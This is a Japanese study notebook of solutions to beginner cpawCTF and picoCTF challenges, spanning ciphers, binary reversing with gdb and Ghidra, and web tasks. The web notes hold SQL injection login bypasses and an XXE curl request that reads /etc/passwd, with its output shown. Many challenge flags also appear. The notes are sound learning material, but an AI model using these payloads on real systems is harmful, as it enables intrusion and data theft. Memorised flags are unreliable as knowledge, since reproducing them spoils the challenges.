@@ -1,0 +1,2459 @@
+
+フラグ形式
+cpaw{this_is_Cpaw_CTF}
+picoCTF{s4n1ty_v3r1f13d_2aa22101}
+
+
+[Crypto] シーザー暗号
+cpawCTF\Level_1_2_[Crypto] Classical Cipher.mhtml
+picoCTF\002_Cryptography_1_Mod 26.png
+pythonプログラムで1～25文字（25通り）ずらした結果を表示
+cyberchefで4文字ずらした結果を表示 ROT13
+
+[Crypto] シーザー暗号
+051_Cryptography_caesar
+26回ずらして、意味が通る結果をフラグと判定
+
+[Cryptography] シーザー暗号 26回ずらして、意味が通る結果をフラグと判定
+121_Cryptography_rotation回転
+
+xqkwKBN{z0bib1wv_l3kzgxb3l_555957n3}
+wpjvJAM{y0aha1vu_k3jyfwa3k_555957m3}
+voiuIZL{x0zgz1ut_j3ixevz3j_555957l3}
+unhtHYK{w0yfy1ts_i3hwduy3i_555957k3}
+tmgsGXJ{v0xex1sr_h3gvctx3h_555957j3}
+slfrFWI{u0wdw1rq_g3fubsw3g_555957i3}
+rkeqEVH{t0vcv1qp_f3etarv3f_555957h3}
+qjdpDUG{s0ubu1po_e3dszqu3e_555957g3}
+picoCTF{r0tat1on_d3crypt3d_555957f3}	// フラグ
+ohbnBSE{q0szs1nm_c3bqxos3c_555957e3}
+ngamARD{p0ryr1ml_b3apwnr3b_555957d3}
+mfzlZQC{o0qxq1lk_a3zovmq3a_555957c3}
+leykYPB{n0pwp1kj_z3ynulp3z_555957b3}
+kdxjXOA{m0ovo1ji_y3xmtko3y_555957a3}
+jcwiWNZ{l0nun1ih_x3wlsjn3x_555957z3}
+ibvhVMY{k0mtm1hg_w3vkrim3w_555957y3}
+haugULX{j0lsl1gf_v3ujqhl3v_555957x3}
+gztfTKW{i0krk1fe_u3tipgk3u_555957w3}
+fyseSJV{h0jqj1ed_t3shofj3t_555957v3}
+exrdRIU{g0ipi1dc_s3rgnei3s_555957u3}
+dwqcQHT{f0hoh1cb_r3qfmdh3r_555957t3}
+cvpbPGS{e0gng1ba_q3pelcg3q_555957s3}
+buoaOFR{d0fmf1az_p3odkbf3p_555957r3}
+atnzNEQ{c0ele1zy_o3ncjae3o_555957q3}
+zsmyMDP{b0dkd1yx_n3mbizd3n_555957p3}
+yrlxLCO{a0cjc1xw_m3lahyc3m_555957o3}
+
+
+[Cryptography] レールフェンス暗号を複合するとフラグが求まる
+095_Cryptography_rail-fenceレールフェンス
+Rail fence cipher
+https://en.wikipedia.org/wiki/Rail_fence_cipher
+解読サイト（句読点とスペースを維持するに☑）
+https://www.dcode.fr/rail-fence-cipher
+紙に書いて複合する
+
+
+[Cryptography] 流出したユーザー名に対応するパスワード（シーザー暗号で暗号化）を複合するとフラグが求まる
+081_Cryptography_credstuff信用できるもの
+cvpbPGS{P7e1S_54I35_71Z3}
+picoCTF{C7r1F_54V35_71M3}
+
+
+[Cryptography] ビジュネル暗号
+048_Cryptography_Easy1
+暗号文　UFJKXQZQUNB
+鍵　　　SOLVECRYPTO
+平文　　CRYPTOISFUN
+https://linesegment.web.fc2.com/application/cipher/Vigenere.html
+
+
+[Reversing] ファイル種別の特定
+[Misc]      ファイル種別の特定
+[General_Skills]
+cpawCTF\Level_1_3_[Reversing] Can you execute.mhtml
+cpawCTF\Level_1_4_[Misc] Can you open this file .mhtml
+fileコマンド：ファイル種別の表示　executable、Microsoft Office Word
+stringsコマンド：バイナリファイルの可読部分を表示する
+catコマンド：ファイルの中身を表示する
+readelf -e コマンド：ELF（Executable and Linkable Format）情報を表示する
+
+※実行権がないときは「chmod 777」コマンド
+drwxrwxrwx  「d:ディレクトリ」「rwx:自分」「rwx:グループ」「rwx:全員」
+
+
+[General Skills] ファイルにgrepコマンドを実行してフラグを取得
+054_General Skills_First Grep
+grep pico 054_file
+picoCTF{grep_is_good_to_find_things_5af9d829}
+メモ帳で開いて「pico」で検索してもフラグが見つかる
+
+
+[General Skills] zipファイルを解凍して、コマンドプロンプトで当該フォルダに移動して、findコマンドでフラグが書かれているファイルを見つける（又はTresgrep）
+107_General Skills_Big Zipビッグジップ
+
+find -type f -exec grep "picoCTF" {} \;
+-type f：ファイルのみを対象とする
+-type d：ディレクトリのみを対象とする
+-exec  ：検索結果に対してコマンドを実行する
+
+
+[Reverse Engineering] 実行ファイルを実行するとフラグが求まる（拡張子exeがなくても実行可能）
+084_Reverse Engineering_file-run1ファイル実行1
+$ ./084_run
+The flag is: picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b}
+
+[Reverse Engineering] 実行ファイルに引数を渡して実行するとフラグが求まる
+./085_run
+Run this file with only one argument.
+
+./085_run Hello!
+The flag is: picoCTF{F1r57_4rgum3n7_96f2195f}
+
+./085_run H
+Won't you say 'Hello!' to me first?
+
+
+
+[Reversing] 実行ファイルからフラグを抽出
+cpawCTF\Level_2_8_[Reversing]reversing easy!.mhtml
+readelf -e コマンド：ELF（Executable and Linkable Format）情報を表示する
+stringsコマンド：バイナリファイルの可読部分を表示する
+gdbコマンド：デバッガ起動  gdb test.exe、gdb>layout asm
+ layout asm：実行コードを逆アセンブル
+IDA - New - ファイル選択 - Open - OK
+
+
+
+[Reverse Engineering] 実行ファイル（elf）をgdbコマンドでフラグを取得　jumpでsleep処理（0x186a0=100,000秒）を飛ばして実行する
+087_Reverse Engineering_GDB Test DriveGDB テストドライブ
+$ chmod +x gdbme	# gdbmeに実行権限を付ける
+$ gdb gdbme		# gdbmeをデバッグ対象としてGDBを起動する
+(gdb) layout asm	# アセンブリの実行状況を表示する
+(gdb) break *(main+99)	# main+99（sleep処理）にブレークポイントを設定する
+(gdb) run		# 実行開始 ブレークポイントを設定したので、sleepが実行される直前でストップする
+(gdb) jump *(main+104)	# sleep処理をスキップして次の処理へ もうブレークポイントがないので、最後まで実行されてflagが表示される
+
+
+[Reverse Engineering] アセンブリファイル（red）を修正すると、フラグが求まる（原理不明）
+118_Reverse Engineering_Ready Gladiator 0レディグラディエーター 0
+
+$ nc saturn.picoctf.net 65319 < 118_imp.red
+;redcode
+;name Imp Ex
+;assert 1
+mov 0, 1
+end
+Submit your warrior: (enter 'end' when done)
+
+Warrior1:
+;redcode
+;name Imp Ex
+;assert 1
+mov 0, 1
+end
+
+Rounds: 100
+Warrior 1 wins: 0
+Warrior 2 wins: 0
+Ties: 100
+Try again. Your warrior (warrior 1) must lose all rounds, no ties.
+
+$ nc saturn.picoctf.net 65319 < 118_imp_modify.red
+;redcode
+;name Imp Ex
+;assert 1
+mov 0, 0
+end
+Submit your warrior: (enter 'end' when done)
+
+Warrior1:
+;redcode
+;name Imp Ex
+;assert 1
+mov 0, 0
+end
+
+Rounds: 100
+Warrior 1 wins: 0
+Warrior 2 wins: 100
+Ties: 0
+You did it!
+picoCTF{h3r0_t0_z3r0_4m1r1gh7_e1610ed2}
+
+
+
+[Reversing] (出力がない）実行ファイルをghidraでデコンパイルして元のソースコードを復元して、出力を追加して実行
+cpawCTF\Level_3_1_[Reversing]またやらかした！.mhtml
+ghidraRun.bat - Next - Project Directory, Project Name入力 - File - Import File - Select File To import - OK - OK
+ - ghidra画面内のLevel_3_1_rev200ダブルクリック - Yes - Analyze
+ - Symbol Tree - Functions - main - Decompiler画面のコードをコピー - C言語ファイルに変換 - 実行
+
+
+[Binary Exploitation] 不明（ghidraでデコンパイルしてexeを把握してアンダフローで変数を書き換えてフラグを表示させる）
+108_Binary Exploitation_babygame01ベイビーゲーム01
+
+wwwwaaaaという文字列を順に送信し、プレイヤーを原点に移動させる
+aaaaという文字列を順に送信し、アンダフローによりフラグを表示させるか否かを判定させる変数を書き換える
+pを送信するなどしてゲームをクリアさせ、フラグを取得
+
+w:上
+a:左
+
+./game
+Player position: 4 4
+End tile position: 29 89
+Player has flag: 0
+..........................................................................................
+..........................................................................................
+..........................................................................................
+..........................................................................................
+....@.....................................................................................
+..........................................................................................
+
+wwwwaaaaaaaap	// 入力してEnter
+
+You win!
+flage
+picoCTF{gamer_m0d3_enabled_0a880baf}
+
+
+
+[Reverse Engineering] 実行ファイルをghidraで逆コンパイルするとmain関数の出力値（フラグ）が求まる（gdbコマンドでも<main+15>に出力値（フラグ）がある）
+135_Reverse Engineering_GDB baby step 1GDB ベイビーステップ 1
+
+>>> 0x86342
+549698
+
+
+[Reverse Engineering] 実行ファイルをghidraで逆コンパイルし、そのコードをpythonで再現すると出力値（フラグ）が求まる
+136_Reverse Engineering_GDB baby step 2GDB ベイビーステップ 2
+
+local_c = 0x1e0da;
+for (local_10 = 0; local_10 < 0x25f; local_10 = local_10 + 1) {
+  local_c = local_c + local_10;
+}
+
+>>> all=0x1e0da
+>>> for num in range(0, 607):
+...   all += num;
+>>> all
+307019
+
+[Reverse Engineering] 実行ファイルをghidraで逆コンパイルし、main関数の値をエンディアンを変えるとフラグが求まる
+137_Reverse Engineering_GDB baby step 3 ベイビーステップ 3
+　0x2262c96b
+→0x6bc96222
+
+
+[Reverse Engineering] 実行ファイルをghidraで逆コンパイルし、func1関数の値がフラグとなる
+138_Reverse Engineering_GDB baby step 4 ベイビーステップ 4
+
+picoCTF{12905}
+
+>>> 0x28e
+654
+>>> 0x3269
+12905
+
+undefined4 main(void){
+  func1(0x28e);
+  return 0x28e;
+}
+
+int func1(int param_1){
+  return param_1 * 0x3269;
+}
+
+
+[Reverse_Engineering] ARMアセンブリコードをクロスコンパイルしてghidraでデコンパイルして元のソースコードを復元してフラグを取得
+019_Reverse_Engineering_4_ARMssembly 0
+sudo apt install gcc-aarch64-linux-gnu
+aarch64-linux-gnu-as chall.S -o chall
+
+ghidraのfuncは正しいが、mainの処理は正しくないことに注意
+
+>>> hex(4110761777)   pythonのインタラクティブモード
+
+
+[Reverse Engineering] アセンブリコード中にある16進数を10進数に直すとフラグが求まる（アセンブリファイルにすることを試みたが失敗131_disassembler-dump0_a_modify.s）
+131_Reverse Engineering_Bit-O-Asm-1.mhtml
+
+mov    eax,0x30		データ格納
+picoCTF{48}
+
+
+[Reverse Engineering] アセンブリスコード中にある16進数を10進数に直すとフラグが求まる
+132_Reverse Engineering_Bit-O-Asm-2.mhtml
+
+mov    DWORD PTR [rbp-0x4],0x9fe1a	データ格納
+
+
+[Reverse Engineering] アセンブリコードの計算を読み取って16進数を10進数に直すとフラグが求まる（writeupサイトと真似してアセンブリファイルにすることを試みたが失敗、writeupサイトのままのコードなら上手くいく）
+133_Reverse Engineering_Bit-O-Asm-3ビット-O-Asm-3.mhtml
+
+mov    DWORD PTR [rbp-0xc],0x9fe1a	データ格納
+mov    DWORD PTR [rbp-0x8],0x4		データ格納
+imul   eax,DWORD PTR [rbp-0x8]		積
+add    eax,0x1f5			和
+
+python
+>>> (0x9fe1a * 0x4) + 0x1f5
+
+mov	データ格納命令
+add	和
+sub	差
+imul	積
+idiv	商と剰余
+inc	インクリメント
+dec	デクリメント
+SAL	算術左シフト
+SAR	算術右シフト
+SHL	論理左シフト
+SHR	論理右シフト
+AND
+OR
+XOR
+NOT
+
+
+[Reverse Engineering] アセンブリコードの計算を読み取って16進数を10進数に直すとフラグが求まる
+134_Reverse Engineering_Bit-O-Asm-4ビット-O-Asm-4
+
+<+15>:    mov    DWORD PTR [rbp-0x4],0x9fe1a
+<+22>:    cmp    DWORD PTR [rbp-0x4],0x2710
+<+31>:    sub    DWORD PTR [rbp-0x4],0x65
+<+37>:    add    DWORD PTR [rbp-0x4],0x65
+
+アセンブリ命令の疑似コード
+if (0x9fe1a <= 0x2710):
+	eax = 0x9fe1a + 0x65
+else:
+	eax = 0x9fe1a - 0x65
+
+CMP	オペランドを比較してその結果をレジスタに保存
+
+
+[Reverse Engineering] ghidraで実行ファイルを逆コンパイルしてmain関数を見るとフラグが見つかる
+120_Reverse Engineering_Reverse逆行
+
+puts("Password correct, please see flag: picoCTF{3lf_r3v3r5ing_succe55ful_2f0131a4}");
+
+  local_38 = 0x7b4654436f636970;　{FTCocip 	picoCTF{
+  local_30 = 0x337633725f666c33;　3v3r_fl3	3lf_r3v3
+  local_28 = 0x75735f676e693572;　us_gni5r	r5ing_su
+  local_20 = 0x6c75663535656363;　luf55ecc	cce55ful
+  local_18 = 0x613133313066325f;　a1310f2_	_2f0131a	「4}」が足りない
+
+
+
+[Reverse_Engineering] ARMアセンブリコードをクロスコンパイルしてghidraでデコンパイルして元のソースコードを復元してフラグを取得
+034_Reverse Engineering_ARMssembly 1.mhtml
+
+aarch64-linux-gnu-as '034_Reverse Engineering_chall_1.S' -o '034_Reverse Engineering_chall_1'
+
+引数に0x1bを与えると、"You win"を返す
+
+
+[Reverse_Engineering]  ARMアセンブリコードをクロスコンパイルしてghidraでデコンパイルして元のソースコードを復元してフラグを取得
+041_Reverse Engineering_ARMssembly 2
+aarch64-linux-gnu-as chall.S -o chall
+
+ghidraのfuncは+3、正解は*3
+3297082261*3=9891246783=0x24d9072bf
+picoCTF{d15a5m_ftw_5c1d1ae}
+
+
+[Reverse_Engineering]  ghidraでデコンパイルして関数に文字をあてはめてフラグを取得
+059_Reverse Engineering Hurry up! Wait!.mhtml
+
+なぜ以下の関数（FUN_0010298）を使うのか、関数からフラグを求める方法は不明
+Functions - FUN_00102 - FUN_001029 - FUN_0010298a
+
+  ada__calendar__delays__delay_for(1000000000000000);
+  FUN_00102616(); p
+  FUN_001024aa(); i
+  FUN_00102372(); c
+  FUN_001025e2(); o
+  FUN_00102852(); C
+  FUN_00102886(); T
+  FUN_001028ba(); F
+  FUN_00102922(); {
+  FUN_001023a6(); d
+  FUN_00102136(); 1
+  FUN_00102206(); 5
+  FUN_0010230a(); a
+  FUN_00102206(); 5
+  FUN_0010257a(); m
+  FUN_001028ee(); _
+  FUN_0010240e(); f
+  FUN_001026e6(); t
+  FUN_00102782(); w
+  FUN_001028ee(); _
+  FUN_00102206(); 5
+  FUN_00102372(); c
+  FUN_00102136(); 1
+  FUN_001023a6(); d
+  FUN_00102136(); 1
+  FUN_0010230a(); a
+  FUN_001023da(); e
+  FUN_00102956(); }
+  return;
+
+
+[Reverse Engineering] コンパイルされたjavaクラスファイルをghidraでデコンパイルすると、フラグが見つかる
+122_Reverse Engineering_Safe Opener 2金庫オープナー 2
+
+
+[Reverse Engineering] ghidraでデコンパイルしてSymbol Tree - Functions - register_tm_clonesのアセンブリコードにある16進数をCyberchefでFrome Hexするとフラグが求まる
+129_Reverse Engineering_ASCII FTWアスキーFTW
+
+        00101184 c6 45 d0 70     MOV        byte ptr [RBP + local_38],0x70
+        00101188 c6 45 d1 69     MOV        byte ptr [RBP + local_37],0x69
+        0010118c c6 45 d2 63     MOV        byte ptr [RBP + local_36],0x63
+        00101190 c6 45 d3 6f     MOV        byte ptr [RBP + local_35],0x6f
+        00101194 c6 45 d4 43     MOV        byte ptr [RBP + local_34],0x43
+        00101198 c6 45 d5 54     MOV        byte ptr [RBP + local_33],0x54
+        0010119c c6 45 d6 46     MOV        byte ptr [RBP + local_32],0x46
+        001011a0 c6 45 d7 7b     MOV        byte ptr [RBP + local_31],0x7b
+        001011a4 c6 45 d8 41     MOV        byte ptr [RBP + local_30],0x41
+        001011a8 c6 45 d9 53     MOV        byte ptr [RBP + local_2f],0x53
+        001011ac c6 45 da 43     MOV        byte ptr [RBP + local_2e],0x43
+        001011b0 c6 45 db 49     MOV        byte ptr [RBP + local_2d],0x49
+        001011b4 c6 45 dc 49     MOV        byte ptr [RBP + local_2c],0x49
+        001011b8 c6 45 dd 5f     MOV        byte ptr [RBP + local_2b],0x5f
+        001011bc c6 45 de 49     MOV        byte ptr [RBP + local_2a],0x49
+        001011c0 c6 45 df 53     MOV        byte ptr [RBP + local_29],0x53
+        001011c4 c6 45 e0 5f     MOV        byte ptr [RBP + local_28],0x5f
+        001011c8 c6 45 e1 45     MOV        byte ptr [RBP + local_27],0x45
+        001011cc c6 45 e2 41     MOV        byte ptr [RBP + local_26],0x41
+        001011d0 c6 45 e3 53     MOV        byte ptr [RBP + local_25],0x53
+        001011d4 c6 45 e4 59     MOV        byte ptr [RBP + local_24],0x59
+        001011d8 c6 45 e5 5f     MOV        byte ptr [RBP + local_23],0x5f
+        001011dc c6 45 e6 33     MOV        byte ptr [RBP + local_22],0x33
+        001011e0 c6 45 e7 43     MOV        byte ptr [RBP + local_21],0x43
+        001011e4 c6 45 e8 46     MOV        byte ptr [RBP + local_20],0x46
+        001011e8 c6 45 e9 34     MOV        byte ptr [RBP + local_1f],0x34
+        001011ec c6 45 ea 42     MOV        byte ptr [RBP + local_1e],0x42
+        001011f0 c6 45 eb 46     MOV        byte ptr [RBP + local_1d],0x46
+        001011f4 c6 45 ec 41     MOV        byte ptr [RBP + local_1c],0x41
+        001011f8 c6 45 ed 44     MOV        byte ptr [RBP + local_1b],0x44
+        001011fc c6 45 ee 7d     MOV        byte ptr [RBP + local_1a],0x7d
+
+
+
+[Reverse Engineering] アセンブリファイルをコンパイルしてghidraで逆コンパイルし、そこから処理を読み取ってC言語で実装して実行するとフラグが求まる（処理の読み取り不明）
+150_Reverse Engineering_ARMssembly 3ARM アセンブリ 3
+
+aarch64-linux-gnu-as 150_chall_3.S -o 150_chall_3
+
+
+[Reverse Engineering] dex2jarフォルダのd2j-dex2jarを使ってAPKファイルをJARファイル形式に変換し、JARファイルをJD-GUIで開くとフラグが見つかる
+124_Reverse Engineering_timerタイマー
+
+dex2jarをダウンロード
+https://github.com/pxb1988/dex2jar
+
+dex2jar-2.0.zipを解凍して、C:\Users\user\Desktop\picoCTF\dex2jar-2.0\dex2jar-2.0\d2j-dex2jarフォルダに移動し、d2j-dex2jarでAPKファイルをJARファイル形式に変換
+$ d2j-dex2jar -o 124_timer-dex2jar.jar -f 124_timer.apk
+dex2jar 124_timer.apk -> 124_timer-dex2jar.jar
+
+Win-Kexの起動（kaliで実行）
+kex --win -s -m
+
+Win-Kexで以下を実行するとJD-GUIが起動
+wget https://github.com/java-decompiler/jd-gui/releases/download/v1.6.6/jd-gui-1.6.6.jar
+java -jar jd-gui-1.6.6.jar  
+
+JD-GUIに124_timer-dex2jar.jarをドラッグアンドドロップ
+com - example.timer - Buldconfig.classにフラグがハードコードされている
+
+
+[Forensic] ファイルの中にフラグ
+cpawCTF\Level_2_5_[Forensic]leaf in forest.mhtml
+ファイルをメモ帳で開く（不要な文字列を置換で消す）
+
+
+[Forensics] テキストをメモ帳で開いてフラグの一部（picoCTF）で検索すると、大量の文章の中からフラグが見つかる
+091_Forensics_Lookey hereここを見てください
+
+
+[Web] Web内にフラグ
+cpawCTF\Level_1_5_[Web] HTML Page.mhtml
+F12 - Elementsタブのヘッダー(head)
+Elementsタブ：HTMLの各種要素（エレメント）
+
+
+[Web Exploitation] WebでF12して、script.jsとstyle.cssにある文字列を組み合わせるとフラグとなる
+088_Web ExploitationIncludes含まれるもの
+*  picoCTF{1nclu51v17y_1of2_  */
+//  f7w_2of2_b8f4b022}
+
+
+[Web Exploitation] WebでF12して、(index)ファイルを見るとフラグが書かれている
+089_Web Exploitation_Inspect HTMLHTMLを検査する
+	<!--picoCTF{1n5p3t0r_0f_h7ml_8113f7e2}-->
+
+
+[Web Exploitation] Webでのログインに失敗すると、F12でsecure.jsが見られるようになり、secure.jsにユーザー名とパスワードが書かれており、それでログインするとフラグが求まる
+090_Web Exploitation_Local Authority地方自治体
+admin
+strongPassword098765
+
+
+[Web Exploitation] WebでF12して、コメントに書かれている文字列を入力フォームに入力するとフラグが求まる
+113_Web Exploitation_MatchTheRegex
+
+
+
+[Web] WebでSQLコマンドを入力してログイン
+cpawCTF\Level_3_2_[Web]Baby's SQLi - Stage 2-.mhtml
+ユーザー名：porisuteru'--
+パスワード：何でもよい
+
+ユーザー名：porisuteru
+パスワード：' OR 1=1--
+
+'     ：ひとつ前の「'」と対となり、文字列定数（password=）を終わらせる
+OR 1=1： uidの値に関係なく、検索条件を、真とさせる
+--    ： それ以降の内容をコメントとして無視させる
+SELECT uid FROM account_table WHERE uid='' OR 1=1--' AND pw='任意の文字列'
+SELECT *   FROM user_table    WHERE user_name='porisuteru' AND password='' OR '1'='1'
+
+
+[Web Exploitation] Webにログイン後にクッキーを書き換えてフラグを取得
+049_Web Exploitation_logon
+https://jupiter.challenges.picoctf.org/problem/44573/
+http://jupiter.challenges.picoctf.org:44573
+
+ユーザー名：Joe'--
+パスワード：なし
+
+FalseをTreuに書き換える
+書き換え後は、必ずF12画面を閉じた後にWebを更新する
+
+
+[General Skills] 問題文に書かれている文字列をネット検索するとマルウェア名がわかり、そこからフラグが求まる
+114_General Skills_money-wareマネーウェア
+
+
+[Web] WebでSQLを実行してフラグを取得
+cpawCTF\Level_2_9_[Web]Baby's SQLi - Stage 1-.mhtml
+SQL文：データベースへ指示を出す言語
+ 80:http
+443:https
+*  ：全フィールドを表す
+ASC：昇順
+DESC：降順
+SELECT文：条件を指定してデータを検索し、その結果を表示
+SELECT 列名 FROM テーブル名
+SELECT 列名A,列名B,列名C FROM テーブル名A;
+　WHERE句：『FROM テーブル名』の後に付け加えることで、指定した列名のデータから、さらに条件に見合ったデータを抽出
+　WHERE 列名 条件式 値
+　AS句：カラムに別の名前を付ける
+　ORDER BY句：検索結果の並び替え
+　GROUP BY句：データをグループ化する
+INSERT文：指定した値でデータを挿入
+INSERT INTO テーブル名（列名A,列名B,…） VALUE（値A,値B,…）
+UPDATE文：既に登録されているデータの値を変更する
+UPDATE テーブル名 SET 更新内容
+DELETE文：指定した条件で、保存されているデータを消去
+DELETE FROM テーブル名
+
+SELECT [表示する要素名] FROM [テーブル名];
+INSERT INTO [データを追加したいテーブル名] (要素名A,要素名B) VALUES(要素Aに入れるデータ,要素Bに入れるデータ);
+UPDATE [テーブル名] SET [更新処理];
+DELETE FROM [テーブル名];
+
+SELECT 氏名 FROM 社員;　				社員というテーブルから氏名を抽出
+select * from palloc_home　				palloc_homeというテーブルから全フィールドを抽出（*は全フィールドを表す）
+SELECT *FROM 社員 WHERE 男性;　　			社員というテーブルから男性のデータのみを抽出
+SELECT 商品名,税抜き価格*1.10 AS 			税込み価格 FROM 商品;　　税抜き価格を税込み価格に変更
+SELECT * FROM 社員表 ORDER BY ASC;　			IDの昇順に整列　DESCは降順
+SELECT SUM(金額),日付 FROM 買い物の記録 GROUP BY 日付;　日付ごとに使った金額の合計を求める
+INSERT INTO テーブル名（列名A,列名B,…） VALUE（値A,値B,…）
+UPDATE 商品 SET　価格 = 110 WHERE 商品名='りんご’;　　	商品というテーブルにある、りんごの価格を全て110にする
+DELETE FROM テーブル名A WHERE 列名A = NULL;　		列名Aの値が空白のデータのみ削除
+
+
+[Web] リダイレクトされるWeb内にフラグ
+cpawCTF\Level_2_2_[Web] Redirect.mhtml
+F12 - Network - Preserve logにチェックをつける - リンクをクリック - q15.ctf.cpaw.site - Headers - X-Flag
+cpawCTF\Level_2_2_Redirect.png
+Preserve（保存） log：リダイレクトする前のデータが消えないようにする
+
+
+
+[Web_Exploitation] curlコマンドでhttpリクエスト
+picoCTF\9_Web_Exploitation_GET_aHEAD.html
+curlコマンド：様々な通信プロトコルでデータを送って、そのレスポンスを確認できるコマンド
+http リクエストの場合、以下の様に Web サイトのコンテンツがテキストで表示される
+$ curl http://example.com
+This is example index page
+
+ResponseBodyのみ出力( オプション指定なし )		curl    http://mercury.picoctf.net:53554/index.php
+ResponseHeaderのみ出力( -I, --head )			curl -I http://mercury.picoctf.net:53554/index.php
+ResponseHeaderとResponseBodyを出力( -i, --include )	curl -i http://mercury.picoctf.net:53554/index.php
+RequestHeader とResponseBodyを出力( -v --verbose )	curl -v http://mercury.picoctf.net:53554/index.php
+パケットデータ( --trace <file> --trace-ascii <file> )	curl --trace /dev/stdout http://localhost:8000
+
+Chrome - F12 - Souces - index.php
+<form action="index.php" method="GET">
+	<input type="submit" value="Choose Red"/>
+
+<form action="index.php" method="POST">
+	<input type="submit" value="Choose Blue"/>
+
+
+[Web Exploitation] Webサイトにcurlコマンドでhttpリクエストを送るとフラグが求まる
+123_Web Exploitation_SOAP石鹸
+
+curl -H  Request Headerを追加する。Content-Typeを指定する時など　 -H "Content-Type: application/json"
+curl -d  POSTで送信するデータを記述
+
+//正しいコマンドのとき
+$ curl 'http://saturn.picoctf.net:61539/data' \
+> -H 'Content-Type: application/xml' \
+> -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT ID ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><data><ID>&xxe;</ID></data>'
+
+Invalid ID: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+flask:x:999:999::/app:/bin/sh
+picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
+
+//「/data」をなくしたとき
+$ curl 'http://saturn.picoctf.net:54883' -H 'Content-Type: application/xml' -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT ID ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><data><ID>&xxe;</ID></data>'
+<!doctype html>
+<html lang=en>
+<title>405 Method Not Allowed</title>
+<h1>Method Not Allowed</h1>
+<p>The method is not allowed for the requested URL.</p>
+
+//「-d」オプションをなくしたとき
+$ curl 'http://saturn.picoctf.net:54883/data' -H 'Content-Type: application/xml'
+<!doctype html>
+<html lang=en>
+<title>405 Method Not Allowed</title>
+<h1>Method Not Allowed</h1>
+<p>The method is not allowed for the requested URL.</p>
+
+//「-H」オプションをなくしたとき
+$ curl 'http://saturn.picoctf.net:54883/data' -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT ID ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><data><ID>&xxe;</ID></data>'
+
+
+
+[Web] Webサイトのクッキーを解析してフラグを取得
+020_Web Exploitation_2_Cookies.mhtmlhttp://mercury.picoctf.net:6418/
+F12 - Applicationタブ - Storage - Cookies - NameとValue
+Valueの値を変えてサイトを更新するとサイトに表示される文字が変わる
+shファイルで値を変えた時の名前を取得する
+※ shはGIt Bashで実行する 
+
+Cookieとは、WEBサイトを閲覧したときに、訪問者が訪れたサイトや入力したデータ、利用環境などの情報が記録されたファイル
+情報を記録することで、ユーザーは２度目にサイトを訪れた際に情報の再入力なしでログインできる、商品を購入する際に住所などの入力を省くことができる
+IDやパスワードなどの個人情報やサイトの閲覧情報を保存
+
+ResponseHeaderとResponseBodyを出力( -i, --include )	curl -i http://mercury.picoctf.net:6418/check 
+エラーメッセージを表示しない				curl -s http://mercury.picoctf.net:6418/check 
+リクエストヘッダを追加					curl -H http://mercury.picoctf.net:6418/check 
+
+
+[Web] Webサイトのソース、css、jsからフラグを取得する
+022_Web_Exploitation_3_Insp3ct0r.mhtml
+
+Webサイトで右クリック - ページのソースを表示
+ソース、ソースのmycss.cssをクリック、ソースのmyjs.jsをクリックしてフラグを取得する
+ページのソースはF12のElementsと同じだが、mycss.cssとmyjs.jsのリンクはページのソースでしかできない
+
+
+[Web Exploitation] index.jsに書かれている文字列をBase64変換するとフラグが求まる
+061_Web Exploitation_loginログイン
+
+login.mars.picoctf.net - F12 - Sources - index.js
+Cyberchefで「From Base64」または「Magic」
+cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ
+picoCTF{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}
+
+
+[Reverse Engineering] Javaのコードに書かれているBase64で変換された文字列をCyberChefで逆変換するとフラグが求まる
+097_Reverse Engineering_Safe Openerセーフオープナー
+javaをコンパイル、実行するときは元のファイル名でないとうまくいかない
+cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz
+pl3as3_l3t_m3_1nt0_th3_saf3
+
+
+[General Skill] 配布された文字列をCyberchefでFrom Base64を5回するとフラグが求まる
+119_General Skills_repetitions繰り返し
+
+VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh
+RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk
+MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW
+VkpEVGxaYVdFMVhSbFZrTTBKVVZXcE9VazFXV2toT1dHUllDbUY2UWpSWk1GWlhWa2RHZEdWRlZs
+aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg==
+
+
+[Web Exploitation] Webサイトフラグを取得する
+036_Web Exploitation_Some Assembly Required 1.mhtml
+
